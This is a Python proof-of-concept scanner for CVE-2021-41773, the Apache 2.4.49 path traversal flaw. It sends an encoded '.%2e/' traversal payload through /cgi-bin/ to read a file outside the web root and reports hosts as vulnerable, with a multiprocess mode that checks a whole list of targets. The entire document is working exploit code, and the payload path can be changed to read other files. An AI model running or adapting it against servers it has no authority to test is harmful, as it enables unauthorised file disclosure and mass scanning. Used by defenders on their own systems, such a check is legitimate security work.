############################################################################
# PoC for CVE-2021-41773                                                   #
# By: Jordan Jay (@0xLegacyy)                                              #
# Modified: Remon Svensson (@RemonSwe)                                     #
# Apache 2.4.49 is the only version vulnerable to this.                    #
############################################################################

import argparse, requests
import os
import multiprocessing as mp

# Default variable for amount of cores to run when args "-F" is run.
DEFAULT_CORES = 1


def chunkify(fname,chunkSize=4096):
    fileEnd = os.path.getsize(fname)
    with open(fname,'rb') as f:
        chunkEnd = f.tell()
        while True:
            chunkStart = chunkEnd
            f.seek(chunkSize,1)
            f.readline()
            chunkEnd = f.tell()
            yield chunkStart, chunkEnd - chunkStart
            if chunkEnd > fileEnd:
                break


def process(poc, host):
    poc.host = host
    res = poc.run()
    if res == 1:
        print(f"[+] {poc.host} is vulnerable!")
    elif res == 0:
        print(f"[-] {poc.host} is not vulnerable!")
    elif res == 30:
        pass

    return


def process_wrapper(chunkStart, chunkSize, fname, verifySsl):
    poc = POC()
    poc.verifySsl = verifySsl
    with open(fname) as f:
        f.seek(chunkStart)
        hosts = f.read(chunkSize).splitlines()
        for host in hosts:
            process(poc, host)


class POC:
    def __init__(self, args=None):
        if args is not None:
            self.host = args.host
            self.verifySsl = args.verifySsl
            self.file = args.targetFile
            self.cores = args.cores
            if not ("://" in self.host):
                print("[!] Host paramater missing protocol (http:// or https://)\n")
                exit(-1)
            if self.file is None:
                self.single()
            else:
                self.threaded()
        else:
            self.host = ""

    def single(self):
        # Parse args.
        # Try reading /usr/share/bash-completion/bash_completion, is world readable and in /usr/share, so default config should allow us to read it.
        # If we see the flag in the response, it's vulnerable.
        flag = "bash_completion - programmable completion functions for bash"
        payload = ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/usr/share/bash-completion/bash_completion"
        try:
            if flag not in requests.get(f"{self.host}/cgi-bin/{payload}", verify=self.verifySsl).content.decode():
                print(f"[-] {self.host} not vulnerable")
                exit(-1)
            print(f"[+] {self.host} is vulnerable!")
        except(Exception):
            print("Exception:", self.host)

    def threaded(self):
        pool = mp.Pool(int(self.cores))
        jobs = []

        for chunkStart, chunkSize in chunkify(self.file):
            jobs.append(pool.apply_async(process_wrapper, (chunkStart, chunkSize, self.file, self.verifySsl)))

        for job in jobs:
            job.get()

        pool.close()

    def run(self):
        # Try reading /usr/share/bash-completion/bash_completion, is world readable and in /usr/share, so default config should allow us to read it.
        # If we see the flag in the response, it's vulnerable.
        flag = "bash_completion - programmable completion functions for bash"
        payload = ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/usr/share/bash-completion/bash_completion"
        try:
            if flag not in requests.get(f"{self.host}/cgi-bin/{payload}", verify=self.verifySsl).content.decode():
                return 0
            return 1
        except(Exception):
            print("Exception:", self.host)
            return 30


if __name__ == "__main__":

    # Set up args.
    parser = argparse.ArgumentParser(description="Checks if an apache server is vulnerable to CVE-2021-41773.")

    parser.add_argument(
        "host",
        help="ip/domain to be checked e.g. 'https://google.com/'."
    )
    parser.add_argument(
        "--nosslcheck", "-n", dest='verifySsl', action='store_false',
        help="Do not verify ssl certificates."
    )
    parser.add_argument(
        "--cores", "-C", dest="cores", default=DEFAULT_CORES,
        help=f"Specify number of cores that should be dedicated to the task, default: {DEFAULT_CORES}"
    )
    parser.add_argument(
        "--file", "-f", dest="targetFile", default=None,
        help="Specify file to fetch, example: \"/usr/share/bash-completion/bash_completion\""
    )

    parser.set_defaults(verifySsl=True)

    args = parser.parse_args()
    poc = POC(args)
